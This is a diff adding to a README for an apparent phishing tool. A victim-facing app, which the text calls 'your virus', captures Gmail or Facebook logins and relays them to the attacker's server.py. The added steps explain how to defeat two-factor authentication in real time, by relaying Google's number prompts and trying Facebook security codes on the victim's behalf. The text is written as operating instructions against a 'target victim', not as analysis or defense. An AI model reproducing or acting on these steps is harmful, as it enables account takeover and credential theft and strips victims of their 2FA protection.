@@ -6,6 +6,25 @@ First,check your ip address in your device
  - In reality,target victim will click this file
 4. click gmail button or facebook button
 5. fill gmail and password and then click login
-6. watch console or terminal of server.py 
+6. watch console or terminal of server.py
+
+if two-factor authentication
+1. fill your ip addres both open_app and server python files
+2. open server.py
+ - In reality,wait until target victim click your virus
+3. open open_app.py
+ - In reality,target victim will click this file
+4. click gmail button or facebook button
+5. fill gmail and password and then click login
+6. watch console or terminal of server.py
+    - check gmail and password. test to login
+    - if request authentication from google, do following
+gmail two factor -------------------
+7. input "y" in server.py
+8. input 3 choice numbers that got from google authentication
+9. you got number from target victim
+facebook two factor -------------------
+7. input "y" in server.py
+8. test to input security code. if security code is wrong, input "n" or not input "y"
 enjoy it
 * you can change Interface more beautiful if you have programming knowledge
